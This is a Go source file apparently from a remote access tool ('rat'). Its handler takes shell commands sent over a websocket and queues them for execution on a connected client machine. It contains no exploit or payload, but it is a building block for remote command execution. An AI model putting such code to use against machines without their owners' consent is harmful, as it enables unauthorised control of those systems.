package main

import (
	"encoding/json"
	"rat/common"

	"golang.org/x/net/websocket"
)

type ShellEvent struct {
	Action  int    `json:"action"`
	Command string `json:"command"`
}

type ShellMessage Message

func (d ShellMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	var shellEvent ShellEvent
	err := json.Unmarshal([]byte(data), &shellEvent)
	if err != nil {
		return err
	}

	client.Listeners[common.ShellHeader] = ws
	client.Queue <- ShellPacket{shellEvent.Action, shellEvent.Command}

	return nil
}
